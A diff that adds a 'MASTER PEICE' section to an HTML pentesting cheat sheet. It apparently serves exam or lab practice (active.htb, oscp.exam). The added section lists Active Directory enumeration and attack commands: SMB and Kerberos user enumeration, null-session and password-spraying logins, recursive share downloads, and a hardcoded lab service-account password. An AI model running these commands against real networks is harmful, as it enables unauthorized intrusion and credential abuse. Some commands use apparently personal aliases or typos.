@@ -191,6 +191,43 @@
   <button class="hamburger" id="hamburgerBtn"><i class="fas fa-bars"></i></button>
   <h1 class="page-title"><strong>Pentesting</strong> Cheat Sheet</h1>
   <p class="page-description">All sections · dark theme · sidebar navigation</p>
+  <!-- ===== MASTER ONE ===== -->
+  <h2 id="host-discovery">🖥️ MASTER PEICE</h2>
+  <pre class="code"><code># ----
+nxc smb <MS01-IP> --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm -rf /tmp/hosts.tmp
+
+nxc smb <MS02-IP> --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm -rf /tmp/hosts.tmp
+
+nxc smb <DC01-IP> --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm -rf /tmp/hosts.tmp
+
+nxc smb <DC01-IP> --generate-krb5-file /tmp/krb5.tmp && sudo mv /tmp/krb5.tmp /etc/krb5.conf
+
+sudo fixtime -i MS01 
+sudo fixtime -i DC01 (after pivot)
+
+sudo scanner
+
+nxc smb 10.129.4.15/24
+
+smbmap -H MS01
+
+enum4linux -a MS01
+
+impacket-GetADUsers -all active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip <IP>
+
+kerbrute userenum -d oscp.exam --dc $IP /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+nxcsmb MS01 -u '' -p ''  --all 
+
+boxc MS01 -u SVC_TGS -p GPPstillStandingStrong2k18
+
+boxc MS01 -u users.txt -p pass.txt
+
+impacket-smbclient <IP>
+
+smbclient //<IP>/Replication -N -c "prompt OFF; recurse ON; mget *"
+
+impacket-smbclient SVC_TGS:'GPPstillStandingStrong2k18'@<IP></code></pre>
 
   <!-- ===== HOST DISCOVERY ===== -->
   <h2 id="host-discovery">🖥️ Host Discovery</h2>
